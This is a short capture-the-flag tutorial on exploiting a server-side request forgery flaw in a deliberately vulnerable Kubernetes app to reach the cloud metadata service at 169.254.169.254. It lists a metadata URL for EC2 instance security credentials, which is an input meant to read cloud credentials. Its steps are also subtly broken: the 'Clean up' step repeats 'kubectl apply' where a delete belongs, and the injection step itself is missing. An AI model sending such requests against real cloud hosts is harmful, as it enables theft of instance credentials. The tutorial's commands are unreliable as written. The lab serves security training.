# Security: Exploiting SSRF in Kubernetes

SSRF (Server Side Request Forgery) has become a very popular attack in cloud native environments.  SSRF allows an attacker to trick the server to make an internal call (usually a 169.254, non addressable IP) to an metadata service.  Metadata services contain all sorts of information about currently running cloud instances and it's used to manage, configure and access other cloud services. 

> Instance metadata is data about your instance that you can use to configure or manage the running instance. **Instance metadata can be accessed at the IP address 169.254.169.254 which is a link-local address and is valid only from the instance.**
> 

The IP block `169.254.0.0/16` is reserved for [link-local IPv4 addresses.](http://tools.ietf.org/html/rfc3927)

In this challenge, we will deploy an app to our cluster that has an SSRF vulnerability.  We will exploit  the vulnerability to access the metadata service and get the flag.

1. Deploy the challenge.
```
kubectl apply -f deployment_starwars_ssrf.yaml
```

2. Get endpoint of the service.

```
kubectl get svc
```

```
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```
[http://169.254.169.254/latest/meta-data/ami-id](http://169.254.169.254/latest/meta-data/ami-id)

3. [Submit the flag.](https://devslop.ctfd.io/challenges#Challenge%2018-11)

4. Clean up.
```
kubectl apply -f deployment_starwars_ssrf.yaml
```
